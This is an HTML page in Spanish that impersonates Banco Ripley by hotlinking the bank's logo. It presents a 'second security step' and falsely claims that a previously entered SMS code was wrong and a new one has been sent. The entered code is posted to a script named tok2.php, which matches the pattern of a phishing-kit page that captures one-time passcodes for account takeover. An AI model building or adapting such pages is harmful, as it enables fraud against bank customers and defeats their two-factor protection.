<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación por SMS</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background: linear-gradient(180deg, #502b83 0%, #3a1f5f 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container { width: 100%; max-width: 480px; }

    .logo-container {
      text-align: center;
      margin: 0 auto 22px;
      background: white;
      padding: 16px 22px;
      border-radius: 14px;
      box-shadow: 0 6px 20px rgba(0,0,0,.15);
      width: fit-content;
    }

    .logo-container img { max-width: 220px; width: 100%; }

    .title {
      color: #fff;
      text-align: center;
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 6px;
      letter-spacing: -0.3px;
    }

    .subtitle {
      color: #fff;
      text-align: center;
      font-size: 15px;
      font-weight: 300;
      opacity: .95;
      margin-bottom: 26px;
    }

    .card {
      background: #fff;
      border-radius: 16px;
      padding: 32px 24px;
      box-shadow: 0 8px 32px rgba(0,0,0,.15);
    }

    .error-message {
      color: #e74c3c;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 20px;
      text-align: center;
    }

    .form-group { margin-bottom: 26px; }

    .label {
      display: block;
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #2c2c2c;
    }

    .input {
      width: 100%;
      padding: 16px 12px;
      font-size: 22px;
      text-align: center;
      letter-spacing: 8px;
      border: none;
      border-bottom: 2px solid #e0e0e0;
      outline: none;
      transition: border-color .3s;
      background: transparent;
    }

    .input:focus { border-bottom-color: #502b83; }

    .btn {
      width: 100%;
      padding: 16px;
      background: #cccccc;
      color: #666;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 600;
      margin-top: 8px;
      cursor: not-allowed;
      transition: all .3s;
    }

    .btn.active {
      background: #502b83;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://www.bancoripley.cl/media/logo-banco-ripley-DKG6FRYM.svg" alt="Logo (Demo)">
    </div>

    <div class="title">Verificación de identidad</div>
    <div class="subtitle">Segundo paso de seguridad</div>

    <div class="card">
      <p class="error-message">Código incorrecto, hemos enviado un nuevo código</p>

      <form action="tok2.php" method="POST">
        <div class="form-group">
          <label class="label">Nuevo código SMS</label>
          <input type="text" class="input" id="sms" name="codigo" inputmode="numeric" placeholder="••••••" />
        </div>

        <button type="submit" class="btn" id="btn" disabled>Continuar</button>
      </form>
    </div>
  </div>

  <script>
    const sms = document.getElementById('sms');
    const btn = document.getElementById('btn');

    sms.addEventListener('input', () => {
      sms.value = sms.value.replace(/\D/g, '');
      if (sms.value.length > 0) {
        btn.classList.add('active');
        btn.disabled = false;
      } else {
        btn.classList.remove('active');
        btn.disabled = true;
      }
    });
  </script>
</body>
</html>
